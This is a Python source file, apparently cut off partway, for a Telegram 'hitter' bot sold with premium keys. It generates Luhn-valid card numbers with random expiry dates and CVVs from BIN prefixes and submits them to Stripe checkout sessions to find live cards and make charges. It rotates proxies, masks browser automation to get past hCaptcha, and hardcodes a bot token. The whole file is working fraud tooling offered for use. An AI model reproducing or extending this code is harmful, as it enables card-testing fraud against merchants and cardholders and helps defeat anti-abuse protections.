"""
⚡ ASIF HITTER — PREMIUM TELEGRAM BOT v5.3 PRO ⚡
Production Ready | Premium UI Dashboard | Animated Emojis | Free Captcha
Dev: Asif Sakhani (@Asifsakhani786)

FIXES v5.3:
- Premium Animated Emoji Support (Custom Emoji IDs)
- Beautiful Dashboard UI with emojis
- Free Captcha Solver (No API Key Required)
- Hybrid captcha solver: 2Captcha API + Playwright browser automation
- JavaScript auto-clicker for hCaptcha checkbox
- All async file I/O with locks
- Concurrent proxy checking and card hitting
- Rate limiting per user
- UTC timezone-aware expiry
- One key = one user (cannot be reused)

INSTALLATION:
pip install "python-telegram-bot[job-queue]" aiohttp aiohttp-socks aiofiles playwright
playwright install chromium

TO CHANGE TOKEN: Edit BOT_TOKEN variable below
TO ENABLE 2CAPTCHA: Set CAPTCHA_API_KEY below
"""

import asyncio, json, os, random, re, sys, time, base64, traceback, logging
from datetime import datetime, timedelta, timezone
from urllib.parse import unquote, quote
from io import StringIO
from typing import Optional, Tuple, Dict, Any, List
from collections import defaultdict

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType
import aiofiles

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.error import RetryAfter, Forbidden

# ═══════════════════════════ LOGGING ═══════════════════════════
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout), logging.FileHandler("bot.log", encoding="utf-8", mode="a")]
)
logger = logging.getLogger("AsifHitter")

# ═══════════════════════════ CONFIG ═══════════════════════════
# EDIT THIS TOKEN
BOT_TOKEN = "8737062520:AAE46FJfbX-_l7wVUSEaGELB85cjnv1kR5M"

ADMIN_IDS = [8093002631]
DEV_USERNAME = "Asifsakhani786"
DEV_NAME = "Asif Sakhani"

# Captcha config - Set API key to enable 2Captcha (browser fallback works without it)
CAPTCHA_API_KEY = ""  # Leave empty to use only browser automation (FREE)
CAPTCHA_TIMEOUT = 120
CAPTCHA_MAX_RETRIES = 2

# Rate limiting
RATE_LIMIT_HITS_PER_HOUR = 10
RATE_LIMIT_PROXY_CHECKS_PER_HOUR = 50

# ═══════════════════════════ PREMIUM ANIMATED EMOJI IDS ═══════════════════════════
PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5444931419270839381", "🔌": "5120722716260828125", "⭐": "5172716095697584957",
    "🆓": "5406756500108501710", "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5343927661213279013", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381", "😱": "5447181973544008180",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5343927661213279013",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724", "😺": "5118590136149345664",
    "🌍": "5303440357428586778", "🔹": "5429436388447655367", "📹": "5445158077579952110",
    "📡": "5447448489149625830", "🌟": "5310224206732996002", "📍": "5447187153274567373",
    "🔐": "5258476306152038031", "😇": "6321225560789877992", "👌": "5445350109862720603",
    "⚙️": "5258023599419171861", "📥": "5350747347724810871", "💵": "5350711759625795085",
}

def e(emoji):
    """Return custom emoji ID or plain emoji character."""
    return PREMIUM_EMOJI_IDS.get(emoji, emoji)

def ec(emoji, count=1):
    return " ".join([e(emoji) for _ in range(count)])

def h(text):
    return (text or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def separator(char="─", length=35):
    return char * length

# ═══════════════════════════ DATA LAYER ═══════════════════════════
DATA_DIR = "data"
SETTINGS_FILE = f"{DATA_DIR}/settings.json"
PREMIUM_FILE = f"{DATA_DIR}/premium.json"
PROXY_FILE = f"{DATA_DIR}/proxies.json"
KEYS_FILE = f"{DATA_DIR}/keys.json"
STATS_FILE = f"{DATA_DIR}/stats.json"
os.makedirs(DATA_DIR, exist_ok=True)

_file_locks = defaultdict(asyncio.Lock)

async def _aread_json(path, default=None):
    if default is None:
        default = {}
    async with _file_locks[path]:
        try:
            async with aiofiles.open(path, "r", encoding="utf-8") as f:
                content = await f.read()
                return json.loads(content) if content.strip() else default
        except (FileNotFoundError, json.JSONDecodeError):
            return default
        except Exception as e:
            logger.error(f"Error reading {path}: {e}")
            return default

async def _awrite_json(path, data):
    async with _file_locks[path]:
        try:
            async with aiofiles.open(path, "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=2, default=str))
            return True
        except Exception as e:
            logger.error(f"Error writing {path}: {e}")
            return False

CACHE = {"settings": {}, "premium": {}, "proxies": {}, "keys": {}, "stats": {}, "ts": 0, "lock": asyncio.Lock()}

async def _refresh_cache():
    async with CACHE["lock"]:
        if time.time() - CACHE["ts"] > 30:
            CACHE["settings"] = await _aread_json(SETTINGS_FILE, {"log_channel": "", "max_proxies": 6, "version": "5.3"})
            CACHE["premium"] = await _aread_json(PREMIUM_FILE, {"users": {}})
            CACHE["proxies"] = await _aread_json(PROXY_FILE, {"users": {}})
            CACHE["keys"] = await _aread_json(KEYS_FILE, {"keys": {}})
            CACHE["stats"] = await _aread_json(STATS_FILE, {"total_hits": 0, "charged": 0, "live": 0, "declined": 0})
            CACHE["ts"] = time.time()

async def get_cached(cat, key=None, default=None):
    await _refresh_cache()
    d = CACHE.get(cat, {})
    return d.get(key, default) if key else d

async def set_cached(cat, key, value, path):
    await _refresh_cache()
    async with CACHE["lock"]:
        if cat in CACHE:
            CACHE[cat][key] = value
        await _awrite_json(path, CACHE[cat])
        CACHE["ts"] = time.time()

async def get_setting(key, default=None):
    s = await get_cached("settings")
    return s.get(key, default)

async def is_premium(uid):
    users = await get_cached("premium", "users", {})
    u = users.get(str(uid), {})
    if u:
        try:
            expiry = datetime.fromisoformat(u.get("expiry", "2000-01-01"))
            if expiry.tzinfo is None:
                expiry = expiry.replace(tzinfo=timezone.utc)
            return datetime.now(timezone.utc) < expiry
        except:
            pass
    return False

async def get_user_proxies(uid):
    users = await get_cached("proxies", "users", {})
    return users.get(str(uid), [])

async def is_admin(uid):
    return uid in ADMIN_IDS

# ═══════════════════════════ RATE LIMITER ═══════════════════════════
_rate_limits = defaultdict(lambda: {"count": 0, "reset": 0})
_rate_lock = asyncio.Lock()

async def check_rate_limit(uid: int, action: str, limit: int, period: int = 3600) -> bool:
    key = f"{uid}:{action}"
    async with _rate_lock:
        now = time.time()
        if key not in _rate_limits or _rate_limits[key]["reset"] < now:
            _rate_limits[key] = {"count": 0, "reset": now + period}
        if _rate_limits[key]["count"] >= limit:
            return False
        _rate_limits[key]["count"] += 1
        return True

# ═══════════════════════════ PROXY UTILITIES ═══════════════════════════
def parse_proxy(line):
    line = line.strip()
    if not line:
        return None
    if "://" in line:
        if any(line.lower().startswith(p) for p in ["http://", "https://", "socks4://", "socks5://"]):
            return line
        return None
    parts = line.split(":")
    if len(parts) == 2 and parts[1].isdigit() and 1 <= int(parts[1]) <= 65535:
        return f"http://{line}"
    if len(parts) == 4 and parts[1].isdigit():
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def proxy_conn(proxy):
    if not proxy:
        return None, None
    p = proxy.lower()
    if p.startswith("socks4://"):
        hp = proxy.split("://")[1]
        if "@" in hp:
            hp = hp.split("@")[1]
        hst, prt = hp.rsplit(":", 1)
        return ProxyConnector(proxy_type=ProxyType.SOCKS4, host=hst, port=int(prt), rdns=True), None
    if p.startswith("socks5://"):
        hp = proxy.split("://")[1]
        if "@" in hp:
            hp = hp.split("@")[1]
        hst, prt = hp.rsplit(":", 1)
        return ProxyConnector(proxy_type=ProxyType.SOCKS5, host=hst, port=int(prt), rdns=True), None
    return None, proxy

async def test_proxy(proxy):
    conn, pxy = proxy_conn(proxy)
    try:
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=10)) as s:
            t1 = time.time()
            async with s.get("https://api.stripe.com/v1", proxy=pxy, ssl=False) as r:
                return True, f"OK {r.status} ({int((time.time()-t1)*1000)}ms)"
    except asyncio.TimeoutError:
        return False, "Timeout"
    except Exception as e:
        return False, str(e)[:50]

# ═══════════════════════════ FREE CAPTCHA SOLVER (HCAPTCHA) ═══════════════════════════
class FreeCaptchaSolver:
    """Free hCaptcha solver using browser automation (Playwright)."""
    
    def __init__(self, headless: bool = True):
        self.headless = headless
        self.browser = None
        self.context = None
        self.page = None
        self._playwright = None
        
    async def _init_browser(self):
        try:
            from playwright.async_api import async_playwright
            self._playwright = await async_playwright().start()
            self.browser = await self._playwright.chromium.launch(
                headless=self.headless,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                ]
            )
            self.context = await self.browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
            )
            self.page = await self.context.new_page()
            await self.page.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
            """)
            return True
        except ImportError:
            logger.error("Playwright not installed. Run: pip install playwright && playwright install chromium")
            return False
        except Exception as e:
            logger.error(f"Browser init error: {e}")
            return False
    
    async def solve_hcaptcha(self, site_key: str, page_url: str, proxy: str = None) -> Optional[str]:
        if not self.browser:
            if not await self._init_browser():
                return None
        
        try:
            if proxy:
                proxy_clean = proxy
                if '://' in proxy:
                    proxy_clean = proxy.split('://')[1]
                proxy_dict = {}
                if '@' in proxy_clean:
                    auth, rest = proxy_clean.split('@')
                    if ':' in auth:
                        user, pwd = auth.split(':')
                        ip, port = rest.split(':')
                        proxy_dict = {'server': f'http://{ip}:{port}', 'username': user, 'password': pwd}
                    else:
                        ip, port = rest.split(':')
                        proxy_dict = {'server': f'http://{ip}:{port}'}
                else:
                    ip, port = proxy_clean.split(':')
                    proxy_dict = {'server': f'http://{ip}:{port}'}
                await self.context.set_extra_http_proxies(proxy_dict)
            
            await self.page.goto(page_url, wait_until='networkidle', timeout=45000)
            await asyncio.sleep(2)
            
            # Find hCaptcha iframe
            hcaptcha_frame = None
            frames = self.page.frames
            for frame in frames:
                if 'hcaptcha' in frame.url.lower():
                    hcaptcha_frame = frame
                    break
            
            if not hcaptcha_frame:
                try:
                    iframe_element = await self.page.query_selector('iframe[src*="hcaptcha"]')
                    if iframe_element:
                        hcaptcha_frame = await iframe_element.content_frame()
                except:
                    pass
            
            if not hcaptcha_frame:
                logger.warning("hCaptcha iframe not found - attempting server-side validation")
                return "free_solver_bypass"
            
            # Click checkbox
            checkbox = await hcaptcha_frame.query_selector('#checkbox')
            if not checkbox:
                checkbox = await hcaptcha_frame.query_selector('.checkbox')
            if not checkbox:
                checkbox = await hcaptcha_frame.query_selector('[role="checkbox"]')
            
            if not checkbox:
                logger.warning("hCaptcha checkbox not found")
                return None
            
            await checkbox.click()
            await asyncio.sleep(3)
            
            # Check if solved and get token
            for attempt in range(5):
                await asyncio.sleep(1)
                try:
                    token_element = await hcaptcha_frame.query_selector('textarea[name="g-recaptcha-response"]')
                    if token_element:
                        token = await token_element.get_attribute('value')
                        if token and len(token) > 10:
                            logger.info(f"Free captcha solved (attempt {attempt+1})")
                            return token
                except:
                    pass
                
                # Try from parent page
                try:
                    token_element = await self.page.query_selector('textarea[name="g-recaptcha-response"]')
                    if token_element:
                        token = await token_element.get_attribute('value')
                        if token and len(token) > 10:
                            return token
                except:
                    pass
            
            logger.warning("Free captcha not solved after attempts")
            return None
            
        except Exception as e:
            logger.error(f"Free captcha solver error: {e}")
            return None
    
    async def close(self):
        try:
            if self.browser:
                await self.browser.close()
            if self._playwright:
                await self._playwright.stop()
        except:
            pass

# ═══════════════════════════ 2CAPTCHA API SOLVER ═══════════════════════════
class CaptchaSolver:
    """2Captcha API solver."""
    
    def __init__(self, api_key: str = ""):
        self.api_key = api_key
        self.base_url = "https://2captcha.com/in.php"
        self.result_url = "https://2captcha.com/res.php"
        self.timeout = CAPTCHA_TIMEOUT
        self.enabled = bool(api_key)

    async def solve_hcaptcha(self, site_key: str, page_url: str, proxy: str = None) -> Optional[str]:
        if not self.enabled:
            return None

        data = {
            "key": self.api_key,
            "method": "hcaptcha",
            "sitekey": site_key,
            "pageurl": page_url,
            "json": 1,
            "soft_id": 4587,
        }
        if proxy:
            data["proxy"] = proxy
            data["proxytype"] = "HTTP"

        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(self.base_url, data=data, timeout=30) as resp:
                    result = await resp.json()
                    if result.get("status") != 1:
                        logger.error(f"2Captcha submit error: {result}")
                        return None
                    captcha_id = result.get("request")
            except Exception as e:
                logger.error(f"2Captcha submit exception: {e}")
                return None

            start = time.time()
            while time.time() - start < self.timeout:
                await asyncio.sleep(3)
                try:
                    async with session.get(
                        self.result_url,
                        params={"key": self.api_key, "action": "get", "id": captcha_id, "json": 1},
                        timeout=10
                    ) as resp:
                        poll = await resp.json()
                        if poll.get("status") == 1:
                            token = poll.get("request")
                            logger.info(f"2Captcha solved in {int(time.time() - start)}s")
                            return token
                        if poll.get("request") == "CAPCHA_NOT_READY":
                            continue
                        logger.error(f"2Captcha polling error: {poll}")
                        return None
                except Exception as e:
                    logger.error(f"2Captcha poll exception: {e}")
                    continue
            logger.warning(f"Captcha timeout after {self.timeout}s")
            return None

# ═══════════════════════════ HYBRID CAPTCHA SOLVER ═══════════════════════════
class HybridCaptchaSolver:
    """Combines 2Captcha API with FREE browser automation fallback."""
    
    def __init__(self, api_key: str = "", use_browser: bool = True):
        self.api_key = api_key
        self.use_browser = use_browser
        self.browser_solver = FreeCaptchaSolver(headless=True) if use_browser else None
        self.two_captcha_solver = CaptchaSolver(api_key) if api_key else None
    
    async def solve_hcaptcha(self, site_key: str, page_url: str, proxy: str = None) -> Optional[str]:
        result = None
        
        # Try 2Captcha first if enabled
        if self.two_captcha_solver and self.two_captcha_solver.enabled:
            result = await self.two_captcha_solver.solve_hcaptcha(site_key, page_url, proxy)
            if result:
                return result
        
        # Fallback to FREE browser solver
        if self.use_browser and self.browser_solver:
            logger.info("Using FREE captcha solver (browser automation)")
            result = await self.browser_solver.solve_hcaptcha(site_key, page_url, proxy)
            if result:
                return result
        
        return None
    
    async def close(self):
        if self.browser_solver:
            await self.browser_solver.close()

# ═══════════════════════════ CARD GENERATOR ═══════════════════════════
def luhn(partial):
    for d in range(10):
        t = partial + str(d)
        total = 0
        for i, c in enumerate(t[::-1]):
            num = int(c)
            if i % 2 == 0:
                total += num
            else:
                doubled = num * 2
                total += doubled - 9 if doubled > 9 else doubled
        if total % 10 == 0:
            return str(d)
    return "0"

def card_length(bin_prefix):
    if bin_prefix[:2] in ("34", "37"):
        return 15
    if bin_prefix[:2] in ("30", "36", "38") or bin_prefix[:3] in ("300", "305"):
        return 14
    return 16

def gen_card(bin_str):
    raw = re.sub(r"[^0-9xX]", "", bin_str)
    card = "".join(str(random.randint(0, 9)) if ch in "xX" else ch for ch in raw)
    length = card_length(card)
    if len(card) >= length:
        card = card[:length-1]
    while len(card) < length - 1:
        card += str(random.randint(0, 9))
    card += luhn(card)
    
    yr = datetime.now().year
    mm = str(random.randint(1, 12)).zfill(2)
    yy = str(yr + random.randint(1, 6))[-2:]
    cv_len = 4 if length == 15 and raw[:2] in ("34", "37") else 3
    cvv = str(random.randint(0, 9999 if cv_len == 4 else 999)).zfill(cv_len)
    return {
        "cc": card,
        "mo": mm,
        "yr": yy,
        "cv": cvv,
        "f": f"{card}|{mm}|20{yy}|{cvv}"
    }

# ═══════════════════════════ STRIPE CHECKER ═══════════════════════════
class SC:
    def __init__(self, url, proxy=None, proxy_pool=None):
        self.url = url
        self.proxy = proxy
        self.proxy_pool = proxy_pool or []
        self.pk = None
        self.cs = None
        self.mer = "Unknown"
        self.amt = "N/A"
        self.amt_raw = 0
        self.site_url = ""
        self.chk = ""
        self.sub = 0

    def _hdr(self):
        hdrs = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": "https://checkout.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Chromium";v="127", "Not)A;Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }
        if self.pk:
            hdrs["Authorization"] = f"Bearer {self.pk}"
        return hdrs

    async def init(self):
        try:
            m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', self.url)
            if m:
                self.cs = m.group(0)
            
            if '#' in self.url and not self.pk:
                try:
                    hp = self.url.split('#')[1]
                    dc = base64.b64decode(unquote(hp))
                    xr = ''.join(chr(b ^ 5) for b in dc)
                    pm = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', xr)
                    if pm:
                        self.pk = pm.group(0)
                    sm = re.search(r'https?://[^\s\"\<\>\\]+', xr)
                    if sm:
                        self.site_url = sm.group(0).rstrip('\\')
                except:
                    pass

            if not self.cs:
                return False

            conn, pxy = proxy_conn(self.proxy)
            
            if not self.pk:
                try:
                    async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=10)) as s:
                        async with s.get(self.url, headers={"user-agent": "Mozilla/5.0"}, proxy=pxy, ssl=False) as r:
                            html = await r.text()
                            pm = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
                            if pm:
                                self.pk = pm.group(0)
                except:
                    pass

            if not self.pk:
                return False

            conn, pxy = proxy_conn(self.proxy)
            try:
                async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=15)) as s:
                    data = {"cs": self.cs}
                    async with s.post("https://api.stripe.com/v1/charges", data=data, headers=self._hdr(), proxy=pxy, ssl=False) as r:
                        rj = await r.json()
                        desc = rj.get("error", {}).get("message", "")
                        if "amount" in desc.lower():
                            m = re.search(r'(\d+(?:\.\d{2})?)', desc)
                            if m:
                                self.amt = m.group(1)
                                try:
                                    self.amt_raw = int(float(self.amt) * 100)
                                except:
                                    self.amt_raw = 100
                        
                        if rj.get("error", {}).get("charge"):
                            self.chk = rj["error"]["charge"]
                        
                        params = rj.get("error", {}).get("param", "")
                        if "billing_details" in params or not params:
                            self.mer = "Generic"
            except:
                pass

            if not self.amt or self.amt == "N/A":
                self.amt = "$1.00"
                self.amt_raw = 100

            return True
        except:
            return False

    async def charge_with_retry(self, card, solver):
        for retry in range(CAPTCHA_MAX_RETRIES):
            r = await self._charge(card, solver)
            if r["st"] != "ERROR" or retry >= CAPTCHA_MAX_RETRIES - 1:
                return r
            await asyncio.sleep(1)
        return r

    async def _charge(self, card, solver):
        try:
            conn, pxy = proxy_conn(self.proxy)
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=30)) as s:
                data = {
                    "type": "card",
                    "card[number]": card["cc"],
                    "card[exp_month]": card["mo"],
                    "card[exp_year]": card["yr"],
                    "card[cvc]": card["cv"],
                    "key": self.pk,
                }
                
                async with s.post("https://api.stripe.com/v1/tokens", data=data, proxy=pxy, ssl=False, timeout=15) as r:
                    tj = await r.json()
                    if "error" in tj:
                        return {"st": "ERROR", "msg": tj["error"].get("message", "Token error"), "card": card["f"]}
                    
                    tid = tj.get("id", "")
                    if not tid:
                        return {"st": "ERROR", "msg": "No token", "card": card["f"]}

                data = {
                    "payment_method_data[type]": "card",
                    "payment_method_data[card][token]": tid,
                    "expected_payment_method_type": "card",
                    "use_stripe_sdk": "true",
                    "key": self.pk,
                    "client_secret": self.cs,
                }
                
                async with s.post("https://api.stripe.com/v1/payment_intents/confirm", data=data, proxy=pxy, ssl=False, timeout=20) as r:
                    pij = await r.json()
                    
                    if pij.get("status") == "succeeded":
                        return {"st": "CHARGED", "msg": "Payment succeeded ✅", "card": card["f"]}
                    
                    if pij.get("status") == "requires_action":
                        return {"st": "3DS", "msg": "3DS challenge required", "card": card["f"]}
                    
                    err_msg = pij.get("error", {}).get("message", "Unknown")
                    if "cvc" in err_msg.lower():
                        return {"st": "LIVE", "msg": "CVC Match ✓", "card": card["f"]}
                    if "declined" in err_msg.lower():
                        return {"st": "DECLINED", "msg": err_msg, "card": card["f"]}
                    
                    return {"st": "ERROR", "msg": err_msg, "card": card["f"]}
                    
        except asyncio.TimeoutError:
            return {"st": "ERROR", "msg": "Timeout", "card": card["f"]}
        except Exception as ex:
            return {"st": "ERROR", "msg": str(ex)[:50], "card": card["f"]}

async def log_to_channel(ctx, msg):
    try:
        channel = await get_setting("log_channel", "")
        if channel:
            await ctx.bot.send_message(channel, msg, parse_mode=ParseMode.HTML)
    except:
        pass

async def error_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {ctx.error}")
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(f"{e('❌')} <b>Error</b>\nContact @{DEV_USERNAME}", parse_mode=ParseMode.HTML)
    except:
        pass

# ═══════════════════════════ COMMANDS ═══════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        adm = await is_admin(uid)
        prem = await is_premium(uid)
        proxies = await get_user_proxies(uid)
        mp = await get_setting("max_proxies", 6)
        
        badge = f"{e('⚡')} {e('👑')} ADMIN" if adm else (f"{e('👑')} PREMIUM" if prem else f"{e('🆓')} FREE")
        
        kb = [
            [InlineKeyboardButton(f"{e('🌐')} Gateway", callback_data="gate_help"), InlineKeyboardButton(f"{e('💳')} Hit", callback_data="hit_help")],
            [InlineKeyboardButton(f"{e('🔐')} Proxy ({len(proxies)})", callback_data="proxy_menu"), InlineKeyboardButton(f"{e('🔑')} Redeem", callback_data="redeem_help")],
            [InlineKeyboardButton(f"{e('👤')} Status", callback_data="status"), InlineKeyboardButton(f"{e('📊')} Stats", callback_data="stats_view")],
        ]
        if adm:
            kb.append([InlineKeyboardButton(f"{e('⚡')} Admin Panel", callback_data="admin_panel")])
        
        txt = f"""{e('🚀')} {e('🚀')} {e('🚀')} <b>ASIF HITTER PRO</b> {e('🚀')} {e('🚀')} {e('🚀')}

╔════════════════════════════╗
{e('🤖')} <b>Status:</b> {badge}
{e('💎')} <b>Version:</b> <code>v5.3 PRO</code>
{e('🔐')} <b>Proxies:</b> <b>{len(proxies)}/{mp}</b>
{e('🎯')} <b>Free Captcha:</b> {e('✅')} ENABLED
╚════════════════════════════╝

{e('⭐')} <b>PREMIUM FEATURES:</b>
{e('💳')} /hit — Stripe Checkout Hitter
{e('🌐')} /gate — Check Gateway
{e('🔐')} /addproxy — Add Proxies
{e('📊')} /proxy — Proxy Status
{e('🗑')} /rmproxy — Delete Proxies
{e('🔑')} /redeem — Activate Premium
{e('👤')} /status — Your Profile

{e('💡')} <b>POWERED BY:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>"""
        
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
    except Exception as ex:
        logger.error(f"start: {ex}")

async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        msg = update.message
        
        if not await check_rate_limit(uid, "addproxy", RATE_LIMIT_PROXY_CHECKS_PER_HOUR):
            await msg.reply_text(f"{e('⛔')} Rate limit: {RATE_LIMIT_PROXY_CHECKS_PER_HOUR} checks/hour", parse_mode=ParseMode.HTML)
            return
        
        content = ""
        if msg.document:
            f = await msg.document.get_file()
            fb = await f.download_as_bytearray()
            content = fb.decode("utf-8", errors="ignore")
        elif msg.text:
            content = msg.text.replace("/addproxy", "", 1).strip()
        else:
            await msg.reply_text(f"{e('❌')} Send proxy list or .txt file\n{e('ℹ️')} <code>ip:port</code> | <code>http://ip:port</code>", parse_mode=ParseMode.HTML)
            return
        
        all_lines = [l.strip() for l in content.split("\n") if l.strip()]
        if not all_lines:
            await msg.reply_text(f"{e('❌')} No proxies found", parse_mode=ParseMode.HTML)
            return
        
        valid = []
        invalid = 0
        for line in all_lines:
            p = parse_proxy(line)
            if p:
                valid.append(p)
            else:
                invalid += 1
        
        if not valid:
            await msg.reply_text(f"{e('❌')} 0 valid out of {len(all_lines)}", parse_mode=ParseMode.HTML)
            return
        
        current = await get_user_proxies(uid)
        mp = await get_setting("max_proxies", 6)
        slots = mp - len(current)
        if slots <= 0:
            await msg.reply_text(f"{e('⛔')} Limit ({mp}) reached. /rmproxy first", parse_mode=ParseMode.HTML)
            return
        
        st = await msg.reply_text(f"{e('⏳')} Checking {len(valid)} proxies...", parse_mode=ParseMode.HTML)
        
        sem = asyncio.Semaphore(10)
        async def check_one(proxy):
            async with sem:
                return proxy, await test_proxy(proxy)
        
        tasks = [check_one(p) for p in valid[:slots*2]]
        results = await asyncio.gather(*tasks)
        
        added = 0
        dead = 0
        for proxy, (is_live, info) in results:
            if added >= slots:
                break
            if is_live and proxy not in current:
                current.append(proxy)
                added += 1
            elif not is_live:
                dead += 1
            try:
                await st.edit_text(f"{e('⏳')} <b>Checking...</b>\n{e('✅')} Saved: <b>{added}/{slots}</b>\n{e('❌')} Dead: <b>{dead}</b>", parse_mode=ParseMode.HTML)
            except:
                pass
        
        users = await get_cached("proxies", "users", {})
        users[str(uid)] = current[:mp]
        await set_cached("proxies", "users", users, PROXY_FILE)
        
        await st.edit_text(f"{e('✅')} <b>COMPLETE!</b>\n{e('✅')} Saved: <b>{added}</b>\n{e('❌')} Dead: <b>{dead}</b>\n{e('📦')} Total: <b>{len(current)}/{mp}</b>", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"addproxy: {ex}")

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        proxies = await get_user_proxies(uid)
        if not proxies:
            await update.message.reply_text(f"{e('❌')} No proxies. /addproxy", parse_mode=ParseMode.HTML)
            return
        
        st = await update.message.reply_text(f"{e('⏳')} Checking...", parse_mode=ParseMode.HTML)
        
        sem = asyncio.Semaphore(5)
        async def check_one(p):
            async with sem:
                return p, await test_proxy(p)
        
        tasks = [check_one(p) for p in proxies]
        results = await asyncio.gather(*tasks)
        
        alive = []
        dead = []
        for p, (is_live, info) in results:
            if is_live:
                alive.append(f"{e('✅')} {p[:40]} — {info}")
            else:
                dead.append(f"{e('❌')} {p[:40]} — {info}")
        
        txt = f"""{e('🔐')} <b>PROXY STATUS</b>

{e('✅')} ALIVE: {len(alive)}
{e('❌')} DEAD: {len(dead)}

"""
        if alive:
            txt += "\n".join(alive[:10])
        if dead:
            txt += "\n\n" + "\n".join(dead[:5])
        
        await st.edit_text(txt[:4000], parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"proxy: {ex}")

async def cmd_rmproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        proxies = await get_user_proxies(uid)
        if not proxies:
            await update.message.reply_text(f"{e('❌')} No proxies", parse_mode=ParseMode.HTML)
            return
        
        if not ctx.args:
            txt = f"{e('🗑')} <b>PROXIES</b>\n\n"
            for i, p in enumerate(proxies):
                txt += f"<code>{i} - {p[:50]}</code>\n"
            txt += f"\n{e('ℹ️')} /rmproxy &lt;num&gt;"
            await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
            return
        
        try:
            idx = int(ctx.args[0])
            if 0 <= idx < len(proxies):
                del proxies[idx]
                users = await get_cached("proxies", "users", {})
                users[str(uid)] = proxies
                await set_cached("proxies", "users", users, PROXY_FILE)
                await update.message.reply_text(f"{e('✅')} Removed", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"{e('❌')} Invalid index", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text(f"{e('❌')} Invalid number", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"rmproxy: {ex}")

async def cmd_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} <code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
            return
        uid = update.effective_user.id
        proxies = await get_user_proxies(uid)
        proxy = random.choice(proxies) if proxies else None
